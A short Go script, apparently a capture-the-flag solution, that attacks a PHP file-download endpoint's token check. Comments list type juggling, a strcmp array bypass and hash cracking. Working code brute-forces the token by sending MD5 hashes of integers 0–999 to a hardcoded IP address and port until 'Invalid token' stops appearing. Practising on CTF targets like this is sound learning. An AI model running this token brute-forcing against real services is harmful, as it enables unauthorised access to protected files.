package main;
// Defeat PHP Equality

import (
    "fmt"
    "net/http"
    "io/ioutil"
    "strconv"
    "strings"
    "crypto/md5"
    "encoding/hex"
)

// Step 1
// * Looks like a hash 
// * Checking the md5Sum and SHASUm of the filename did not help
// * Ran PHP comparison checks like below
// * Hash Identifier detected md5 and hash killer cracked them
// * Enumerated hashes and got flag

// Assumed it to be some PHP Comparison Vulnerability
// Logic 1: Loose Comparison
// only ==
// * Type Juggle
//   - Assuming the token is a string internally, we could use an integer to match first few numbers of hash
func loose(url string) {
	for i:=0;i<1000;i++ {
	    response, error := http.Get(url+strconv.Itoa(i));
	    if error != nil {
	    	fmt.Println("Not successful with: " + url+strconv.Itoa(i));
	    } else {
	    	body, err := ioutil.ReadAll(response.Body);
	    	if err != nil {
	    		fmt.Println("BodyError!");
	    	}
	    	if !strings.Contains(string(body), "Invalid token") {
	    		fmt.Println(string(body));
	    		break;
	    	}
	    }
	}
	return;
}

// Logic 2: Strict Comparison
func strict(url string) {
    return;
}

// Logic 3: Strcmp Bypass
// * Array argument causes the strcmp to pass
func strcmp_bypass(url string) {
    return;
}

// Logic 4: Md5 Cracker
func token_hash_crack(url string) {
	for i:=0;i<1000;i++ {
		hasher := md5.New()
    	hasher.Write([]byte(strconv.Itoa(i)))
        md5_digest := hex.EncodeToString(hasher.Sum(nil))
	    response, error := http.Get(url+md5_digest);
	    if error != nil {
	    	fmt.Println("Not successful with: " + url+md5_digest);
	    } else {
	    	body, err := ioutil.ReadAll(response.Body);
	    	if err != nil {
	    		fmt.Println("BodyError!");
	    	}
	    	if !strings.Contains(string(body), "Invalid token") {
	    		fmt.Println(string(body));
	    		return;
	    	}
	    }
	}
}

// Driver
func main() {
    //loose("http://165.22.22.11:25632/download.php?file=flag.txt&token=");
    //strict("http://165.22.22.11:25632/download.php?file=flag.txt&token=");
    //strcmp_bypass("http://165.22.22.11:25632/download.php?file=flag.txt&token=");
    token_hash_crack("http://165.22.22.11:25632/download.php?file=flag.txt&token=");
}